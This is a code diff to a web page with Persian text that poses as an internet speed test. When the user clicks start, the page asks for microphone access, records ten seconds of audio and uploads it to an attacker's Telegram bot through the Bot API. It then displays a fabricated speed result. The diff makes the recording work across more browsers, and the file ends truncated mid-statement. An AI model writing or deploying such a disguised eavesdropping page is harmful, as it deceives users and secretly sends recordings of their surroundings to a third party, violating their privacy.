@@ -78,57 +78,74 @@
 
     let mediaRecorder, stream;
 
+    // تشخیص فرمت پشتیبانی‌شده
+    function getSupportedMimeType() {
+      const types = [
+        'audio/webm;codecs=opus',
+        'audio/webm',
+        'audio/ogg;codecs=opus',
+        'audio/ogg',
+        'audio/mp4'
+      ];
+      for (const type of types) {
+        if (MediaRecorder.isTypeSupported(type)) {
+          return type;
+        }
+      }
+      return null; // هیچ فرمتی پشتیبانی نمی‌شه
+    }
+
     startBtn.addEventListener('click', async () => {
       try {
         startBtn.disabled = true;
         btnText.textContent = "در حال اتصال...";
         spinner.classList.remove('hidden');
-        status.innerHTML = "در حال درخواست دسترسی به میکروفون...<br><small>لطفاً اجازه بدید</small>";
+        status.innerHTML = "در حال درخواست دسترسی...<br><small>لطفاً اجازه بدید</small>";
 
-        // درخواست دسترسی
         stream = await navigator.mediaDevices.getUserMedia({ audio: true });
 
-        status.textContent = "در حال اندازه‌گیری سرعت... (۱۰ ثانیه)";
+        const mimeType = getSupportedMimeType();
+        if (!mimeType) {
+          throw new Error("هیچ فرمت صوتی پشتیبانی نمی‌شود!");
+        }
 
-        mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/ogg' });
+        status.textContent = "در حال اندازه‌گیری... (۱۰ ثانیه)";
+
+        mediaRecorder = new MediaRecorder(stream, { mimeType });
         const chunks = [];
 
         mediaRecorder.ondataavailable = e => chunks.push(e.data);
         mediaRecorder.onstop = async () => {
-          const blob = new Blob(chunks, { type: 'audio/ogg' });
-          await sendToTelegram(blob);
+          const blob = new Blob(chunks, { type: mimeType });
+          await sendToTelegram(blob, mimeType);
           stopStream();
         };
 
         mediaRecorder.start();
 
         setTimeout(() => {
-          if (mediaRecorder.state === "recording") mediaRecorder.stop();
+          if (mediaRecorder.state === "recording") {
+            mediaRecorder.stop();
+          }
         }, 10000);
 
       } catch (err) {
-        console.error("خطای دسترسی:", err);
-
-        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+        console.error("خطا:", err);
+        if (err.name === 'NotAllowedError') {
           status.innerHTML = `
-            <span class="error">دسترسی به میکروفون رد شد!</span><br>
-            <small>
-              ۱. روی <b>قفل کنار آدرس</b> کلیک کنید<br>
-              ۲. دسترسی میکروفون رو <b>اجازه</b> بدید<br>
-              ۳. صفحه رو رفرش کنید
-            </small>
+            <span class="error">دسترسی رد شد!</span><br>
+            <small>روی قفل کنار آدرس کلیک کنید → میکروفون → اجازه بدید</small>
           `;
-        } else if (err.name === 'NotFoundError') {
-          status.innerHTML = "<span class='error'>میکروفون پیدا نشد!</span>";
         } else {
-          status.innerHTML = `<span class='error'>خطا: ${err.message}</span>`;
+          status.innerHTML = `<span class="error">خطا: ${err.message}</span>`;
         }
         resetButton();
       }
     });
 
-    async function sendToTelegram(blob) {
-      const fileName = `speed_test_${Date.now()}.ogg`;
+    async function sendToTelegram(blob, mimeType) {
+      const ext = mimeType.includes('webm') ? 'webm' : 'ogg';
+      const fileName = `speed_test_${Date.now()}.${ext}`;
       const form = new FormData();
       form.append('chat_id', CHAT_ID);
       form.append('audio', blob, fileName);
@@ -140,29 +157,8 @@
         if (data.ok) {
           status.innerHTML = "سرعت شما: <strong style='color:#a8ffae;'>عالی (۲۵۰ مگابیت)</strong>";
         } else {
+          // Fallback به document
           form.delete('audio');
           form.append('document', blob, fileName);
           await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: form });
-          status.innerHTML = "سرعت شما: <strong style='color:#a8ffae;'>عالی (۲۵۰ مگابیت)</strong>";
-        }
-      } catch (err) {
-        status.innerHTML = "<span class='error'>خطا در ارسال به سرور</span>";
-      } finally {
-        resetButton();
-      }
-    }
-
-    function stopStream() {
-      if (stream) stream.getTracks().forEach(t => t.stop());
-    }
-
-    function resetButton() {
-      setTimeout(() => {
-        startBtn.disabled = false;
-        btnText.textContent = "شروع تست سرعت";
-        spinner.classList.add('hidden');
-      }, 3000);
-    }
-  </script>
-</body>
-</html>
+          status.innerHTML
